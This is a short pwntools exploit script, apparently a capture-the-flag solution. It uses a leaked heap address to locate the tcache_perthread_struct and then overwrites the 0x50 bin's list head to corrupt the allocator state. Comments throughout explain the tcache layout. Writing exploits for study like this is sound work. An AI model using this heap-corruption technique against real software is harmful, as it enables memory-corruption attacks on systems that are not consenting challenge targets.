#!/usr/bin/env python3
from pwn import *

e = ELF("s")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "c")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	
	# this solution's probably the worst one
	# since you have to consider if there are chunks before c and d (here, there aren't)
	# in the other solutions, c and d are 0x50 bytes apart
	
	chunk = int(r.recvlineS(keepends=False)[2:], 16)
	# chunk - 0x50 - 0x290 is the beginning of this chunk of size 0x290
	# this chunk contains linked list heads for each bin size
	# it's a tcache_perthread_struct
	# there are 64 bin sizes
	# first, in the struct, are 128 bytes that contain the length of each linked list
	# then, each linked list head takes up 8 bytes
	# the first head is for chunks of size 0x20
	# second for 0x30
	# third for 0x40
	# fourth for 0x50
	#      ...
	# we called malloc(64), so chunk will have size 64+16 = 0x50
	# so, the head is at the struct + 128 + 3*8
	# the struct is at chunk - 0x50 - 0x290
	r.sendline(str(chunk-0x50-0x290+128+3*8).encode())
	# this must be 0 so the allocator thinks that there are no chunks of size 0x50
	# (even though according to the count array, there's one)
	r.sendline(b'0')
	r.interactive()